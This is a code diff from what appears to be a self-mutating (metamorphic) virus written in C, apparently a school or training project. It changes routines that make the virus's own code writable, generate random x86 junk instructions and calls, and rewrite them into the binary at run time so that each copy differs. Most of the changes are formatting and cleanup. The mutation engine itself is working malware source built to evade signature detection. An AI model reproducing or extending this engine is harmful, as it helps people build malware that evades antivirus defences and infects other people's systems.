@@ -87,7 +87,6 @@ static uint8_t get_random_opcode(uint8_t rand) {
 	const uint8_t opcodes[] = {
 		OPCODE_XCHG,
 		OPCODE_MOV,
-		//OPCODE_MOVSX, danger
 		OPCODE_ADD_RM_R,
 		OPCODE_ADD_R_RM,
 		OPCODE_SUB_RM_R,
@@ -187,26 +186,23 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 					nop[offset + 2] = 0x40 | (reg_1 << 3) | reg_2;
 					nop[offset + 3] = ft_nrand();
 					lea_flag = true;
-					break;
 				} else {
 					nop[offset] = 0x48;
 					nop[offset + 1] = 0x83;
 					nop[offset + 2] = 0xC0 | reg_1 | (reg_2 << 3);
 					nop[offset + 3] = ft_nrand();
-					break;
 				}
 				break;
 
 			case 5: 
-				{
-					nop[offset] = 0xE8;
-					void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
-					int size = sizeof(tab) / sizeof(tab[0]);
+				nop[offset] = 0xE8;
+				void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
+				int size = sizeof(tab) / sizeof(tab[0]);
 
-					int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
-					rel_offset = rel_offset - (file_off + 0x7 + offset);
-					ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));
-				}
+				int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
+				rel_offset = rel_offset - (file_off + 0x7 + offset);
+				ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));
+
 				break;
 
 			default:
@@ -244,9 +240,7 @@ static void gen_junk(uint8_t *rdm_junk, int file_off) {
 	if ((reg_1 == 4) || (reg_2 == 4) || (reg_1 == reg_2)) {
 		reg_1 = 0;
 		reg_2 = 1;
-	}
-
-	JUNK;
+	} JUNK;
 
 	rdm_junk[0] = PUSH_OP + reg_1;
 	rdm_junk[1] = PUSH_OP + reg_2;
@@ -254,22 +248,16 @@ static void gen_junk(uint8_t *rdm_junk, int file_off) {
 	fill_nop(rdm_junk + 2, reg_1, reg_2, file_off);
 
 	rdm_junk[JUNK_LEN - 2] = POP_OP + reg_2;
-	rdm_junk[JUNK_LEN - 1] = POP_OP + reg_1;
-
-	JUNK;
+	rdm_junk[JUNK_LEN - 1] = POP_OP + reg_1; JUNK;
 }
-
-#ifdef DEBUG
-//static void print_junk_offsets(void) {
-//	for (size_t i = 0; i < g_nb_junk; i++) {
-//		_printf(STR("g_junk_offsets[%d]: %d\n"), i, g_junk_offsets[i]);
-//	}
-//}
-#endif
 
 static void replace_nop(uint8_t *self, int *junk_offsets) {
 
-	//print_junk_offsets();
+	/* print offsets */
+	//for (size_t i = 0; i < g_nb_junk; i++) {
+	//	_printf(STR("Junk offset: %d\n"), junk_offsets[i]);
+	//}
+	//
 
 	for (size_t i = 0; i < g_nb_junk; i++) {
 
@@ -284,9 +272,7 @@ static void replace_nop(uint8_t *self, int *junk_offsets) {
 
 static int make_writeable(uint8_t *self, size_t size) {
 	uintptr_t start = (uintptr_t)self;
-	uintptr_t end = start + size;
-
-	JUNK;
+	uintptr_t end = start + size; JUNK;
 
 	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
 	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
@@ -303,9 +289,7 @@ void prepare_mutate(void) {
 
 	make_writeable((uint8_t *)start, VIRUS_SIZE);
 
-	getrandom(g_rand, RAND_SIZE, 0);
-
-	JUNK;
+	getrandom(g_rand, RAND_SIZE, 0); JUNK;
 
 	if (g_junk_offsets[0] != 0)
 		return;
@@ -317,9 +301,7 @@ void mutate(void) {
 
 	uintptr_t start = (uintptr_t)&_start;
 
-	replace_nop((uint8_t *)start, g_junk_offsets);
-
-	JUNK;
+	replace_nop((uint8_t *)start, g_junk_offsets); JUNK;
 }
 
 static void write_self_pos(uint8_t *entry) {
